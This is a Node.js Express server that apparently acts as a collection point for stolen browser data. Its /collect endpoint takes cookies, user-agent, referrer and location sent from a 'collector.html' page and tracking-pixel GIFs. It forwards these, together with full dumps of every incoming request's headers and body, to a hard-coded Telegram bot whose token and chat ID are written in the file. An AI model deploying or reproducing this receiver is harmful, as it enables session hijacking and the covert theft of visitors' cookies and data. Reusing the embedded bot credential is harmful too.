const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');

const app = express();

// Body parsers
app.use(bodyParser.json({ type: '*/*', limit: '5mb' }));
app.use(bodyParser.text({ type: '*/*', limit: '5mb' }));

// CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', '*');
  next();
});

// --- Telegram config ---
const TELEGRAM_BOT_TOKEN = '8748740739:AAHPbjfUZ0Y8zyuWRdtCpvEV47ovaPMjMP8';
const TELEGRAM_CHAT_ID = '1903358250';

// Escape text for MarkdownV2
function escapeMarkdownV2(text) {
  if (!text) return '';
  return text.replace(/[_*\[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

// Send Telegram message (auto-split if >4096 chars)
async function telegramMessage(text) {
  const MAX_LEN = 4096;
  const chunks = [];
  for (let i = 0; i < text.length; i += MAX_LEN) {
    chunks.push(text.slice(i, i + MAX_LEN));
  }
  for (const chunk of chunks) {
    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: escapeMarkdownV2(chunk),
        parse_mode: 'MarkdownV2'
      });
    } catch (e) {
      console.error('[Telegram] Failed to send chunk:', e.response?.data || e.message);
    }
  }
}

// Capture raw body early
app.use((req, res, next) => {
  const chunks = [];
  req.on('data', d => chunks.push(d));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    next();
  });
});

// --- Logging middleware ---
app.use((req, res, next) => {
  // Skip health checks
  if (req.url === '/api/vault/status' && req.headers['render-health-check'] === '1') {
    return next();
  }

  const timestamp = new Date().toISOString();
  const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';

  let report = `*Full Request Dump*\n`;
  report += `*Timestamp:* ${timestamp}\n`;
  report += `*IP:* ${ip}\n`;
  report += `*Request Line:* \`${req.method} ${req.url} HTTP/${req.httpVersion}\`\n\n`;

  report += `*Headers:*\n`;
  for (const [k, v] of Object.entries(req.headers)) {
    report += `${k}: ${v}\n`;
  }

  if (req.rawBody && req.rawBody.length > 0) {
    const preview = req.rawBody.length <= 1024
      ? req.rawBody.toString('utf8')
      : req.rawBody.slice(0, 1024).toString('utf8') + '... (truncated)';
    report += `\n*Raw Body (preview):*\n\`\`\`\n${preview}\n\`\`\`\n`;
    report += `*Raw Body (base64):*\n\`\`\`\n${req.rawBody.toString('base64')}\n\`\`\`\n`;
  } else {
    report += `\n*Body:* (none)\n`;
  }

  console.log(`[${timestamp}] ${req.method} ${req.url}`);
  telegramMessage(report).catch(() => {});
  next();
});

// --- Collect endpoint ---
app.post('/collect', (req, res) => {
  const timestamp = new Date().toISOString();
  let parsed = {};
  try { parsed = JSON.parse(req.rawBody); } catch {}

  const { ts, method, cookies, userAgent, referrer, location } = parsed;

  const collectReport = `*Collect Endpoint Payload*\n` +
    `*Timestamp:* ${timestamp}\n` +
    `*Parsed JSON:*\n\`\`\`\n${JSON.stringify(parsed, null, 2)}\n\`\`\`\n` +
    `*Cookies:* ${cookies || ''}\n` +
    `*Referrer:* ${referrer || ''}\n` +
    `*Location:* ${location || ''}\n` +
    `*User-Agent:* ${userAgent || ''}`;

  console.log('=== COLLECTED ===\n', parsed, '\n================');
  telegramMessage(collectReport).catch(() => {});
  res.sendStatus(200);
});

// --- Static files ---
app.get('/collector.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'collector.html'));
});

// --- GIF endpoints ---
const TRANSPARENT_GIF = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');

app.get('/trigger.gif', (req, res) => {
  res.setHeader('Content-Type', 'image/gif');
  res.send(TRANSPARENT_GIF);
  console.log('[trigger.gif] Served transparent pixel');
});

app.get('/button.gif', (req, res) => {
  res.setHeader('Content-Type', 'image/gif');
  res.send(TRANSPARENT_GIF);
  console.log('[button.gif] Served button pixel');
});

// --- Debug pages ---
app.get('/debug', (req, res) => {
  res.send(`
    <h2>Debug Console</h2>
    <pre id="log"></pre>
    <script>
      const logEl = document.getElementById('log');
      const evtSource = new EventSource('/debug-stream');
      evtSource.onmessage = e => logEl.textContent += e.data + '\\n';
    </script>
  `);
});

app.get('/debug-stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.flushHeaders();
  const interval = setInterval(() => {
    res.write(`data: [${new Date().toISOString()}] Heartbeat\\n\\n`);
  }, 30000);
  req.on('close', () => clearInterval(interval));
});

// --- Start server ---
const PORT = process.env.PORT || 80;
app.listen(PORT, () => console.log(`Server listening on port ${PORT}`));